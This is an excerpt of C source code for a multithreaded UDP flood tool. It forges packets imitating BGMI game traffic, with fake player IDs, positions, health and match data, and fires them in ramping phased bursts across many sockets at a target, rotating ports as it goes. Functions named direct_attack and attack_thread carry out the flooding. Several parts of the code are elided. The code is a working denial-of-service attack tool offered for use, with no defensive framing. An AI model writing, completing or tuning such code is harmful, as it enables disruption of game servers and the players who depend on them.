...
#define BATCH_UPDATE_COUNT 2500
#define BASE_BURST_SIZE 40
#define MAX_BURST_SIZE 200

#define PHASE1_DURATION 10
#define PHASE2_DURATION 10
#define PHASE1_POWER 180
...
void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq, unsigned int seed) {
    ...
    int enhanced_pattern = (pattern_type + (seq % 11)) % 4;
    
    switch(enhanced_pattern) {
        case 0: {
            unsigned int magic = 0xDEADBEEF ^ (thread_id * 1313) ^ (seq * 919);
            unsigned int session_id = (thread_id * 777) + (seq % 919);
            ...
            buf[16] = 0xC0 ^ (thread_id & 0x3F);
            buf[17] = thread_id & 0xFF;
            buf[18] = 0x80 ^ ((seq >> 5) & 0x3F);
            buf[19] = (seq >> 8) & 0xFF;
            ...
            if (size >= 22) {
                unsigned short checksum = (size * 919) ^ thread_id ^ (seq & 0xFFFF) ^ 0xCCCC;
        ...
        case 1: {
            buf[0] = 0xAB ^ (seq & 0x7F);
            buf[1] = 0xCD ^ ((seq >> 7) & 0x7F);
            buf[2] = enhanced_pattern ^ 0x55;
            buf[3] = size ^ 0xAA;
            
            unsigned int player_id = 777777 + (thread_id * 7777) + seq + (fast_rand(&seed) % 777);
            memcpy(buf + 4, &player_id, 4);
            
            if (size >= 12) {
                unsigned int game_time = (seq * 13) % 1919;
                memcpy(buf + 8, &game_time, 4);
            }
            
            if (size >= 16) {
                buf[12] = 0x01 ^ (thread_id & 0x1F);
                buf[13] = thread_id & 0xFF;
                buf[14] = 0x03 ^ ((seq >> 3) & 0x1F);
                buf[15] = (seq >> 16) & 0xFF;
            }
            
            if (size >= 28) {
                int pos_x = 777 + ((thread_id * 19 + seq * 7) % 3777);
                int pos_y = 777 + ((thread_id * 23 + seq * 11) % 3777);
                int pos_z = 177 + ((thread_id * 29 + seq * 13) % 777);
            ...
            if (size >= 30) {
                buf[28] = 0x80 ^ (seq & 0x3F);
                buf[29] = (seq >> 8) & 0xFF;
            }
            
            if (size >= 34) {
                int health = 100 - ((thread_id * 3 + seq * 7) % 77);
                memcpy(buf + 30, &health, 4);
            }
            
            if (size >= 38) {
                int ammo = 30 - ((thread_id * 5 + seq * 9) % 25);
            ...
            if (max_i > start_i && size >= 40) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) * (i + 7)) & 0xFF;
                }
            }
            
            if (size >= 22) {
                unsigned short crc = (size * thread_id * 13) ^ (seq * 77);
                memcpy(buf + size - 2, &crc, 2);
            }
            break;
        }
        case 2: {
            buf[0] = 0x56 ^ (thread_id & 0x7F);
            buf[1] = 0x4F ^ ((thread_id >> 7) & 0x7F);
            buf[2] = thread_id & 0xFF;
            buf[3] = 0x43 ^ (seq & 0x7F);
            
            if (size >= 8) {
                unsigned int voice_id = (thread_id * 77777) + seq * 13;
                memcpy(buf + 4, &voice_id, 4);
            }
            
            if (size >= 14) {
                buf[8] = 0x01 ^ (enhanced_pattern & 0x3F);
                buf[9] = enhanced_pattern ^ 0xAA;
            ...
            if (max_i > start_i && size >= 24) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = ((fast_rand(&seed) % 511) ^ (i * 3)) & 0xFF;
                }
            }
        ...
        case 3: {
            ...
            buf[2] = 0x54 ^ ((seq >> 4) & 0x7F);
            buf[3] = 0x43 ^ ((thread_id >> 4) & 0x7F);
            
            if (size >= 8) {
                unsigned int match_id = 777777 + (thread_id * 777) + seq * 17;
                memcpy(buf + 4, &match_id, 4);
            }
            
            if (size >= 10) {
                buf[8] = ((thread_id * 13) % 50) + 1;
                buf[9] = enhanced_pattern ^ 0x77;
            }
            
            if (size >= 22) {
                int zone_x = 1777 + ((thread_id * 37 + seq * 13) % 2777);
                int zone_y = 1777 + ((thread_id * 41 + seq * 17) % 2777);
                int zone_radius = 777 + ((thread_id * 43 + seq * 19) % 1277);
            ...
            if (size >= 30) {
                int remaining_time = 1919 - ((thread_id * 7 + seq * 23) % 777);
            ...
            if (max_i > start_i && size >= 34) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) ^ (i * 5) ^ thread_id) & 0xFF;
                }
            }
            
            if (size >= 24) {
                unsigned int footer = 0x12345678 ^ (thread_id * 1313) ^ (seq * 9191) ^ 0x77777777;
...
void *direct_attack(void *arg) {
    ...
    int seq_counter = thread_idx * 77777;
    int port_change_counter = 0;
    unsigned int seed = (thread_idx * 919191) ^ time(NULL) ^ getpid();
    int current_phase = 1;
    int burst_size = 30;
    int phase1_max_burst = 80;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_phase == 1) {
            if (burst_size < phase1_max_burst) burst_size = phase1_max_burst;
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            create_bgmi_packet(packets[i], PACKET_SIZE, pattern, thread_idx + 7777, seq_counter, seed);
            ...
            if (current_phase == 1 && sent_this_burst == burst_size) {
                if (burst_size < phase1_max_burst) burst_size += 4;
            } else if (current_phase == 3 && sent_this_burst == burst_size) {
                if (burst_size < MAX_BURST_SIZE) burst_size += 2;
            }
            
            port_change_counter++;
            if (port_change_counter >= 1500) {
...
void *attack_thread(void *arg) {
    ...
    int port_change = 0;
    unsigned int seed = (tid * 919191) ^ time(NULL) ^ getpid();
    int current_phase = 1;
    int burst_size = (BASE_BURST_SIZE * PHASE1_POWER) / 100;
    if (burst_size > MAX_BURST_SIZE) burst_size = MAX_BURST_SIZE;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_phase == 1) {
            burst_size = (BASE_BURST_SIZE * PHASE1_POWER) / 100;
            if (burst_size > MAX_BURST_SIZE) burst_size = MAX_BURST_SIZE;
        } else if (current_phase == 3) {
            burst_size = (BASE_BURST_SIZE * PHASE3_POWER) / 100;
            if (burst_size > MAX_BURST_SIZE) burst_size = MAX_BURST_SIZE;
        }
        ...
        if (current_phase == 1 && sent_this_burst == burst_size) {
            if (burst_size < MAX_BURST_SIZE) burst_size += 8;
        } else if (current_phase == 3 && sent_this_burst == burst_size) {
            if (burst_size < MAX_BURST_SIZE) burst_size += 3;
        }
...
int main(int argc, char *argv[]) {
    ...
    if (warm_sock >= 0) {
        char warm_pkt[64];
        memset(warm_pkt, 0x77, 64);
        sendto(warm_sock, warm_pkt, 64, MSG_DONTWAIT,
               (struct sockaddr*)&target_addr, sizeof(target_addr));
        close(warm_sock);
    }
